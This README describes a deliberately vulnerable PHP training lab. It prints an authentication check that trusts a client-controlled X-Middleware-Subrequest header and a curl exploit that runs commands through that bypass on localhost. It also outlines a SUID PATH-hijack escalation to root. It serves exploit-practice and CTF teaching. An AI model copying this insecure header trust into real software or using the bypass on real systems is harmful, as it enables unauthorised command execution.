# Intentional Remote Code Execution Training Machine — Middleware Bypass (v2)

This project provides a deliberately vulnerable environment designed for security research, exploit development practice, and CTF‑style challenges.  
Instead of classic injection flaws, this version demonstrates a **logic‑based authentication bypass** caused by trusting client‑controlled middleware headers.

---

## Vulnerability Summary

The main vulnerability is a **Remote Code Execution (RCE)** chain caused by an **authentication bypass via an insecure middleware trust model**.

### Vulnerable Functions

```php
middleware_allows_access()
system()
shell_exec()
```

The application trusts a client‑supplied internal header:
```
X-Middleware-Subrequest
```

Any request containing the substring **middleware** is treated as authorized.

### Vulnerable Logic

```php
function middleware_allows_access(): bool {
    $hdr = $_SERVER['HTTP_X_MIDDLEWARE_SUBREQUEST'] ?? '';

    // ❌ Vulnerable: trusts client-controlled internal header
    if (strpos($hdr, 'middleware') !== false) {
        return true;
    }

    return isset($_SESSION['user']);
}
```

An attacker can supply:

```
X-Middleware-Subrequest: middleware:middleware:middleware
```

This results in authentication bypass, allowing command execution:
```shell_exec("id");```


# Features of This Lab

- PHP 7.4 backend with intentionally insecure code

- Middleware-style authorization check with trust boundary violation

- Authentication bypass via client‑controlled headers

- Admin‑only command execution endpoint

- Sudo misconfiguration for privilege escalation

- Supports:

    - Authentication Bypass

    - Remote Code Execution (RCE)

> [!NOTE]
> PHP 7.4 backend with intentionally insecure code

🚀 Running the Machine

Build and start:

```
docker-compose build
docker-compose up
```

## Access at:

http://localhost:8080/

🧪 Exploitation Examples

RCE (Authentication Bypass)

```
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware"  "http://localhost:8080/api.php?action=admin&cmd=id"
```

Expected output:

```

<!DOCTYPE html>
<html>
<head>
  <meta charset='UTF-8'>
  <title>Command Output</title>
  <link rel='stylesheet' href='static/css/style.css'>
</head>
<body>
<div class='wrapper'>
  <div class='card'>
    <h3>🧨 Command Executed</h3>
             <pre class='output'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
    <br><br>
    <a class='btn' href='dashboard.php'>← Back</a>
  </div>
</div>
</body>
</html>%

```

# Troubleshooting

```bash
# Force rebuild if SUID binary not found
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

### Using the Provided PoC Script
```
python3 exp.py rce "id"
```


## 🔓 Privilege Escalation

After obtaining a shell as `www-data`, a local privilege escalation vulnerability can be abused.

The system contains a **root-owned SUID binary**:

```/usr/local/bin/checksys```

This binary executes system commands using `system()` without sanitizing the `PATH` environment variable.

By manipulating `PATH`, an attacker can hijack command execution and spawn a **root shell**.

### Outcome

- Privilege escalation from `www-data` → `root`
- Read the final flag:

```/root/flag.txt```

> [!NOTE]
> This misconfiguration is intentional and included for educational purposes only.